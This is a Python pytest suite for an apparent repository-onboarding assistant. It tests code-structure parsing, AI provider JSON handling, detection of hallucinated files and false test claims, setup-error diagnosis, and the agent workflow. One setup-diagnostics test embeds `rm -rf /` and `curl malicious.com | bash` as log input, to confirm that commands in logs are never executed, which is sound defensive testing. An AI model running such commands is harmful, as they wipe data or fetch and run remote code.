"""
FirstPatch AI — Phase 1 Test Suite
Tests for:
1. Code structure & AST extraction (Python AST, multi-language heuristics, syntax error resilience)
2. Gemma AI Provider (structured outputs, markdown JSON fences, JSON repair, timeouts, rate limits, status)
3. Repository Reality Checker (hallucinated files, unknown evidence IDs, commit SHA mismatch, false test claims, bounded repair)
4. Setup Failure Doctor (Python, Node, venv, missing env, port conflict, pytest collection)
5. Agent Orchestrator & Tool pipeline
6. Security checks (prompt isolation, zero command execution)
"""
from __future__ import annotations

import json
from datetime import datetime, timezone
from typing import Any
from unittest.mock import AsyncMock, MagicMock, patch
from uuid import uuid4

import pytest
import respx
from httpx import Response
from pydantic import BaseModel

from app.schemas import (
    AIProviderStatus,
    ContributionPlan,
    DiagnosticRequest,
    EvidenceRef,
    EvidenceStatus,
    EvidenceType,
    GitHubIssue,
    ImplementationStep,
    IssueLabel,
    PlanRequest,
    RepositoryIdentity,
    RepositoryOverview,
)
from app.services.agent.orchestrator import FirstPatchAgentOrchestrator
from app.services.agent.reality_checker import RepositoryRealityChecker
from app.services.agent.tools import (
    AnalyzeCodeStructureTool,
    BuildEvidenceBundleTool,
    DiagnoseSetupErrorTool,
    FetchOpenIssuesTool,
    GenerateContributionPlanTool,
    InspectRepositoryTool,
    RankContributionIssuesTool,
    ValidatePlanEvidenceTool,
)
from app.services.github.client import GitHubNotFoundError, GitHubService
from app.services.mentor.ai_provider import (
    AIProviderAuthError,
    AIProviderError,
    AIProviderRateLimitError,
    AIProviderTimeoutError,
    AIProviderValidationError,
    DeterministicFallbackProvider,
    GoogleAIStudioProvider,
    OllamaProvider,
    extract_json_from_text,
)
from app.services.mentor.diagnostics import ComprehensiveDiagnosticsService
from app.services.repository_analysis.ast_analyzer import CodeStructureAnalyzer


# ---------------------------------------------------------------------------
# Test Fixtures & Sample Data
# ---------------------------------------------------------------------------

SAMPLE_PYTHON_CODE = '''
"""Sample module for AST testing."""
import os
import sys
from datetime import datetime, timezone
from typing import Optional

GLOBAL_CONST = 42

class BaseHandler:
    """Base class docstring."""
    def __init__(self, name: str):
        self.name = name

    def execute(self) -> bool:
        return True

class ServiceRunner(BaseHandler):
    """Derived class."""
    @property
    def status(self) -> str:
        return "active"

    async def run_async(self, timeout: int = 10) -> dict:
        return {"done": True}

def standalone_helper(x: int, y: int) -> int:
    """Helper function docstring."""
    return x + y
'''

SAMPLE_JS_CODE = '''
import React, { useState } from 'react';
import { api } from '@/lib/api';

export class AppController extends BaseController {
    constructor() {
        super();
    }
}

export function renderHeader(title) {
    return title.toUpperCase();
}

export const fetchSummary = async (id) => {
    return await api.get(id);
};
'''

SAMPLE_GO_CODE = '''
package main

import (
    "fmt"
    "net/http"
)

type ServerConfig struct {
    Port int
}

func StartServer(cfg ServerConfig) error {
    return nil
}
'''


def make_sample_repo_overview() -> RepositoryOverview:
    return RepositoryOverview(
        identity=RepositoryIdentity(owner="testorg", repo="testrepo"),
        full_name="testorg/testrepo",
        description="A test repository for unit tests",
        primary_language="Python",
        default_branch="main",
        commit_sha="abcd1234ef5678",
        github_url="https://github.com/testorg/testrepo",
        directory_snapshot=["src", "tests", "src/main.py", "src/auth.py", "requirements.txt", "README.md"],
        config_files=["requirements.txt", "setup.cfg"],
        evidence_refs=[
            EvidenceRef(
                id=uuid4(),
                owner="testorg",
                repo="testrepo",
                commit_sha="abcd1234ef5678",
                file_path="src/main.py",
                evidence_type=EvidenceType.DIRECTORY_STRUCTURE,
                status=EvidenceStatus.VERIFIED,
            )
        ],
    )


# ---------------------------------------------------------------------------
# 1. AST Extraction Tests
# ---------------------------------------------------------------------------

class TestASTExtraction:
    def test_python_ast_classes_and_functions(self):
        analyzer = CodeStructureAnalyzer()
        result = analyzer.analyze_source("src/sample.py", SAMPLE_PYTHON_CODE, "testorg", "testrepo", "sha123")

        assert result.is_ast_parsed is True
        assert result.language == "python"

        class_names = [c.name for c in result.classes]
        assert "BaseHandler" in class_names
        assert "ServiceRunner" in class_names

        # Check inheritance
        runner = next(c for c in result.classes if c.name == "ServiceRunner")
        assert "BaseHandler" in runner.bases

        # Check functions
        fn_names = [f.name for f in result.functions]
        assert "standalone_helper" in fn_names
        assert "run_async" in fn_names

        # Check line ranges
        helper = next(f for f in result.functions if f.name == "standalone_helper")
        assert helper.start_line > 0
        assert helper.end_line >= helper.start_line

    def test_python_ast_imports(self):
        analyzer = CodeStructureAnalyzer()
        result = analyzer.analyze_source("src/sample.py", SAMPLE_PYTHON_CODE, "testorg", "testrepo")

        import_modules = [imp.module for imp in result.imports]
        assert any("os" in m for m in import_modules)
        assert any("datetime" in m for m in import_modules)
        assert len(result.evidence_refs) > 0

    def test_python_syntax_error_resilience(self):
        analyzer = CodeStructureAnalyzer()
        broken_code = "def broken_syntax(:\n   return ???"
        result = analyzer.analyze_source("broken.py", broken_code)

        assert result.is_ast_parsed is False
        assert len(result.warnings) > 0
        assert "syntax error" in result.warnings[0].lower()

    def test_javascript_structural_heuristics(self):
        analyzer = CodeStructureAnalyzer()
        result = analyzer.analyze_source("frontend/app.tsx", SAMPLE_JS_CODE)

        assert result.is_ast_parsed is False
        assert result.language == "javascript/typescript"
        assert len(result.warnings) > 0
        assert "regex heuristics" in result.warnings[0]

        fn_names = [f.name for f in result.functions]
        assert "renderHeader" in fn_names or "fetchSummary" in fn_names

    def test_go_structural_heuristics(self):
        analyzer = CodeStructureAnalyzer()
        result = analyzer.analyze_source("server.go", SAMPLE_GO_CODE)

        assert result.is_ast_parsed is False
        assert result.language == "go"
        fn_names = [f.name for f in result.functions]
        assert "StartServer" in fn_names

    def test_unsupported_language_returns_honest_disclosure(self):
        analyzer = CodeStructureAnalyzer()
        result = analyzer.analyze_source("style.css", "body { color: red; }")

        assert result.is_ast_parsed is False
        assert result.language == "unknown"
        assert len(result.classes) == 0
        assert len(result.functions) == 0
        assert "not supported" in result.warnings[0].lower()


# ---------------------------------------------------------------------------
# 2. Gemma AI Provider Tests
# ---------------------------------------------------------------------------

class SampleOutputSchema(BaseModel):
    summary: str
    action_items: list[str]


class TestGemmaAIProvider:
    def test_json_extraction_raw(self):
        raw = '{"summary": "Test summary", "action_items": ["item1", "item2"]}'
        data = extract_json_from_text(raw)
        assert data["summary"] == "Test summary"
        assert len(data["action_items"]) == 2

    def test_json_extraction_markdown_fence(self):
        text = 'Here is the plan:\n```json\n{"summary": "Fenced summary", "action_items": ["a", "b"]}\n```\nHope this helps!'
        data = extract_json_from_text(text)
        assert data["summary"] == "Fenced summary"

    def test_json_extraction_repair_trailing_commas(self):
        text = '{"summary": "Repaired", "action_items": ["a", "b",],}'
        data = extract_json_from_text(text)
        assert data["summary"] == "Repaired"

    def test_json_extraction_invalid_raises_validation_error(self):
        with pytest.raises(AIProviderValidationError):
            extract_json_from_text("This contains no JSON at all.")

    @pytest.mark.asyncio
    async def test_fallback_provider_status_and_honesty(self):
        provider = DeterministicFallbackProvider()
        status = await provider.health_check()
        assert status == AIProviderStatus.NOT_CONFIGURED

        resp = await provider.complete("System prompt", "User repo data")
        assert resp.is_fallback is True
        assert "not available" in resp.content.lower()

        # generate_structured in fallback must raise AIProviderError without pretending
        with pytest.raises(AIProviderError):
            await provider.generate_structured("sys", "user", SampleOutputSchema)

    @pytest.mark.asyncio
    async def test_google_ai_studio_success(self):
        mock_post_resp = MagicMock()
        mock_post_resp.status_code = 200
        mock_post_resp.json.return_value = {
            "candidates": [
                {
                    "content": {
                        "parts": [
                            {"text": '{"summary": "AI Generated Plan", "action_items": ["inspect", "code"]}'}
                        ]
                    }
                }
            ],
            "usageMetadata": {"totalTokenCount": 85},
        }

        with patch("httpx.AsyncClient.post", new_callable=AsyncMock) as mock_post:
            mock_post.return_value = mock_post_resp
            provider = GoogleAIStudioProvider(api_key="test-key", model="gemma-4-31b-it")
            result, ai_resp = await provider.generate_structured(
                system_prompt="Generate plan",
                user_message="Repository details",
                schema_cls=SampleOutputSchema,
            )

            assert result.summary == "AI Generated Plan"
            assert len(result.action_items) == 2
            assert ai_resp.tokens_used == 85
            assert ai_resp.model == "gemma-4-31b-it"

    @pytest.mark.asyncio
    async def test_google_ai_studio_rate_limit(self):
        mock_post_resp = MagicMock()
        mock_post_resp.status_code = 429
        mock_post_resp.json.return_value = {"error": "Resource exhausted"}

        with patch("httpx.AsyncClient.post", new_callable=AsyncMock) as mock_post:
            mock_post.return_value = mock_post_resp
            provider = GoogleAIStudioProvider(api_key="test-key", model="gemma-4-31b-it", max_retries=0)
            with pytest.raises(AIProviderRateLimitError):
                await provider.complete("sys", "user")

    @pytest.mark.asyncio
    async def test_google_ai_studio_auth_error(self):
        mock_post_resp = MagicMock()
        mock_post_resp.status_code = 403
        mock_post_resp.json.return_value = {"error": "API key not valid"}

        with patch("httpx.AsyncClient.post", new_callable=AsyncMock) as mock_post:
            mock_post.return_value = mock_post_resp
            provider = GoogleAIStudioProvider(api_key="invalid-key", model="gemma-4-31b-it", max_retries=0)
            with pytest.raises(AIProviderAuthError):
                await provider.complete("sys", "user")

    @pytest.mark.asyncio
    async def test_ollama_provider_success(self):
        mock_post_resp = MagicMock()
        mock_post_resp.status_code = 200
        mock_post_resp.json.return_value = {
            "response": '{"summary": "Ollama Plan", "action_items": ["local"]}',
            "eval_count": 45,
        }

        with patch("httpx.AsyncClient.post", new_callable=AsyncMock) as mock_post:
            mock_post.return_value = mock_post_resp
            provider = OllamaProvider(base_url="http://localhost:11434", model="gemma3:12b")
            resp = await provider.complete("sys", "user")
            assert "Ollama Plan" in resp.content
            assert resp.tokens_used == 45


# ---------------------------------------------------------------------------
# 3. Repository Reality Checker Tests
# ---------------------------------------------------------------------------

class TestRepositoryRealityChecker:
    def test_valid_plan_passes(self):
        repo_overview = make_sample_repo_overview()
        known_ev_id = repo_overview.evidence_refs[0].id

        plan = ContributionPlan(
            session_id=uuid4(),
            owner="testorg",
            repo="testrepo",
            issue_number=1,
            issue_title="Bug in main.py",
            issue_url="https://github.com/testorg/testrepo/issues/1",
            summary="Fix bug in main.py",
            relevant_files=["src/main.py"],
            implementation_steps=[
                ImplementationStep(
                    order=1,
                    description="Inspect src/main.py",
                    rationale="Contains entrypoint",
                    relevant_files=["src/main.py"],
                    evidence=EvidenceRef(
                        id=known_ev_id,
                        owner="testorg",
                        repo="testrepo",
                        commit_sha="abcd1234ef5678",
                        file_path="src/main.py",
                        evidence_type=EvidenceType.DIRECTORY_STRUCTURE,
                        status=EvidenceStatus.VERIFIED,
                    ),
                    is_verified=True,
                )
            ],
            suggested_tests=["pytest tests/"],
            evidence_refs=repo_overview.evidence_refs,
        )

        checker = RepositoryRealityChecker()
        report = checker.validate_plan(plan, repo_overview)

        assert report.is_valid is True
        assert len(report.hallucinated_files) == 0
        assert len(report.invalid_evidence_ids) == 0

    def test_hallucinated_file_path_detected_and_repaired(self):
        repo_overview = make_sample_repo_overview()

        plan = ContributionPlan(
            session_id=uuid4(),
            owner="testorg",
            repo="testrepo",
            issue_number=2,
            issue_title="AI plan with hallucinated file",
            issue_url="https://github.com/testorg/testrepo/issues/2",
            summary="Modify backend/nonexistent_service.py",
            relevant_files=["src/main.py", "backend/nonexistent_service.py"],
            implementation_steps=[
                ImplementationStep(
                    order=1,
                    description="Edit backend/nonexistent_service.py",
                    rationale="Fix logic",
                    relevant_files=["backend/nonexistent_service.py"],
                )
            ],
        )

        checker = RepositoryRealityChecker()
        report = checker.validate_plan(plan, repo_overview)

        assert report.is_valid is False
        assert "backend/nonexistent_service.py" in report.hallucinated_files
        assert "src/main.py" in report.verified_files

        # Repaired plan must strip the hallucinated file from relevant_files
        repaired = report.repaired_plan
        assert repaired is not None
        assert "backend/nonexistent_service.py" not in repaired.relevant_files
        assert any("nonexistent_service.py" in u for u in repaired.uncertainties)

    def test_unsupported_test_claim_detected_and_neutralized(self):
        repo_overview = make_sample_repo_overview()

        plan = ContributionPlan(
            session_id=uuid4(),
            owner="testorg",
            repo="testrepo",
            issue_number=3,
            issue_title="Test claim issue",
            issue_url="https://github.com/testorg/testrepo/issues/3",
            summary="Fix and verify",
            relevant_files=["src/main.py"],
            implementation_steps=[
                ImplementationStep(
                    order=1,
                    description="Ran pytest and verified that tests passed successfully",
                    rationale="Proof of fix",
                    relevant_files=["src/main.py"],
                )
            ],
        )

        checker = RepositoryRealityChecker()
        report = checker.validate_plan(plan, repo_overview)

        assert report.is_valid is False
        assert len(report.unsupported_test_claims) > 0
        repaired = report.repaired_plan
        assert repaired is not None
        assert "tests passed" not in repaired.implementation_steps[0].description
        assert any("Test verification notice" in u for u in repaired.uncertainties)

    def test_stale_commit_sha_mismatch(self):
        repo_overview = make_sample_repo_overview()  # commit_sha = abcd1234ef5678

        stale_ev = EvidenceRef(
            id=uuid4(),
            owner="testorg",
            repo="testrepo",
            commit_sha="stale99999999",  # mismatch
            file_path="src/main.py",
            evidence_type=EvidenceType.DIRECTORY_STRUCTURE,
            status=EvidenceStatus.VERIFIED,
        )

        plan = ContributionPlan(
            session_id=uuid4(),
            owner="testorg",
            repo="testrepo",
            issue_number=4,
            issue_title="Stale plan",
            issue_url="https://github.com/testorg/testrepo/issues/4",
            summary="Stale plan",
            relevant_files=["src/main.py"],
            evidence_refs=[stale_ev],
        )

        checker = RepositoryRealityChecker()
        report = checker.validate_plan(plan, repo_overview)

        assert report.commit_sha_valid is False
        assert any("commit SHA" in w for w in report.warnings)


# ---------------------------------------------------------------------------
# 4. Setup Failure Doctor Tests
# ---------------------------------------------------------------------------

class TestSetupFailureDoctor:
    def test_virtualenv_not_active_detected(self):
        req = DiagnosticRequest(
            owner="testorg",
            repo="testrepo",
            error_description="error: externally-managed-environment. This environment is externally managed.",
            command_output="hint: See PEP 668 for the reason.",
        )
        resp = ComprehensiveDiagnosticsService.diagnose(req)
        assert len(resp.findings) > 0
        finding = resp.findings[0]
        assert "virtual environment" in finding.likely_cause.lower()
        assert any("venv" in step for step in finding.safe_diagnostic_steps)

    def test_python_module_not_found_with_package_name(self):
        req = DiagnosticRequest(
            owner="testorg",
            repo="testrepo",
            error_description="ModuleNotFoundError: No module named 'fastapi'",
            command_output="Traceback (most recent call last):\n  File 'main.py', line 1, in <module>",
        )
        repo_overview = make_sample_repo_overview()
        resp = ComprehensiveDiagnosticsService.diagnose(req, repo_overview)

        assert len(resp.findings) > 0
        finding = resp.findings[0]
        assert "fastapi" in finding.likely_cause
        assert any("pip install" in step for step in finding.safe_diagnostic_steps)
        assert finding.confidence == "high"

    def test_node_dependency_error(self):
        req = DiagnosticRequest(
            owner="testorg",
            repo="testrepo",
            error_description="npm ERR! code ERESOLVE unable to resolve dependency tree",
            command_output="peer react@^18.0.0 from react-dom@18.0.0",
        )
        resp = ComprehensiveDiagnosticsService.diagnose(req)
        assert len(resp.findings) > 0
        finding = resp.findings[0]
        assert "node" in finding.likely_cause.lower() or "package" in finding.likely_cause.lower()
        assert any("npm install" in step for step in finding.safe_diagnostic_steps)

    def test_missing_environment_variable(self):
        req = DiagnosticRequest(
            owner="testorg",
            repo="testrepo",
            error_description="KeyError: 'DATABASE_URL'",
            command_output="File 'config.py', line 12, in get_settings\n    url = os.environ['DATABASE_URL']",
        )
        resp = ComprehensiveDiagnosticsService.diagnose(req)
        assert len(resp.findings) > 0
        finding = resp.findings[0]
        assert "DATABASE_URL" in finding.likely_cause
        assert any(".env" in step for step in finding.safe_diagnostic_steps)

    def test_pytest_collection_failure(self):
        req = DiagnosticRequest(
            owner="testorg",
            repo="testrepo",
            error_description="ERROR collecting tests/test_api.py",
            command_output="pytest: error while collecting tests",
        )
        resp = ComprehensiveDiagnosticsService.diagnose(req)
        assert len(resp.findings) > 0
        finding = resp.findings[0]
        assert "pytest" in finding.likely_cause.lower()

    def test_no_command_execution(self):
        """Verify that malicious commands in error logs are never executed."""
        req = DiagnosticRequest(
            owner="testorg",
            repo="testrepo",
            error_description="Failed to run `rm -rf /` or `curl malicious.com | bash`",
            command_output="exit code 127",
        )
        resp = ComprehensiveDiagnosticsService.diagnose(req)
        assert resp.ai_generated is False
        assert "No commands were executed" in resp.disclaimer


# ---------------------------------------------------------------------------
# 5. Agent Tools & Orchestrator Tests
# ---------------------------------------------------------------------------

class TestAgentOrchestrator:
    @pytest.mark.asyncio
    async def test_full_agent_workflow(self):
        mock_github = MagicMock(spec=GitHubService)

        # Mock repository overview data
        mock_github.get_repo = AsyncMock(return_value={
            "full_name": "testorg/testrepo",
            "description": "Test repo",
            "default_branch": "main",
            "language": "Python",
            "stargazers_count": 10,
            "forks_count": 2,
            "open_issues_count": 1,
            "archived": False,
            "html_url": "https://github.com/testorg/testrepo",
        })
        mock_github.get_repository_metadata = mock_github.get_repo
        mock_github.get_default_branch_sha = AsyncMock(return_value="sha12345")
        mock_github.get_tree = AsyncMock(return_value=[
            {"path": "src", "type": "tree"},
            {"path": "src/main.py", "type": "blob"},
            {"path": "tests", "type": "tree"},
            {"path": "requirements.txt", "type": "blob"},
            {"path": "README.md", "type": "blob"},
        ])
        mock_github.get_languages = AsyncMock(return_value={"Python": 1000})
        mock_github.get_readme = AsyncMock(return_value="Welcome to testrepo.\n\nInstall via pip.")
        mock_github.get_file_content = AsyncMock(return_value=SAMPLE_PYTHON_CODE)

        # Mock issues
        mock_github.get_issues = AsyncMock(return_value=(
            [
                {
                    "number": 10,
                    "title": "Fix bug in src/main.py helper",
                    "state": "open",
                    "body": "The standalone_helper function in src/main.py has an off-by-one bug.",
                    "labels": [{"name": "good first issue", "color": "7057ff"}],
                    "created_at": "2024-01-01T00:00:00Z",
                    "updated_at": "2024-01-02T00:00:00Z",
                    "html_url": "https://github.com/testorg/testrepo/issues/10",
                    "comments": 2,
                }
            ],
            False,
        ))

        orchestrator = FirstPatchAgentOrchestrator(
            github=mock_github,
            ai_provider=DeterministicFallbackProvider(),
        )

        plan_req = PlanRequest(owner="testorg", repo="testrepo", issue_number=10)
        result = await orchestrator.execute_plan_workflow(plan_req)

        assert result.repository.full_name == "testorg/testrepo"
        assert result.issue.number == 10
        assert result.plan.issue_number == 10
        assert len(result.code_structures) > 0
        assert result.reality_report.is_valid is True
        assert result.plan.relevant_files == ["src/main.py"]

    @pytest.mark.asyncio
    async def test_agent_issue_not_found_raises(self):
        mock_github = MagicMock(spec=GitHubService)
        mock_github.get_repository_metadata = AsyncMock(return_value={
            "full_name": "testorg/testrepo",
            "default_branch": "main",
            "html_url": "https://github.com/testorg/testrepo",
        })
        mock_github.get_default_branch_sha = AsyncMock(return_value="sha1")
        mock_github.get_tree = AsyncMock(return_value=[])
        mock_github.get_languages = AsyncMock(return_value={})
        mock_github.get_readme = AsyncMock(return_value=None)
        mock_github.get_issues = AsyncMock(return_value=([], False))

        orchestrator = FirstPatchAgentOrchestrator(
            github=mock_github,
            ai_provider=DeterministicFallbackProvider(),
        )

        with pytest.raises(GitHubNotFoundError):
            await orchestrator.execute_plan_workflow(PlanRequest(owner="testorg", repo="testrepo", issue_number=999))
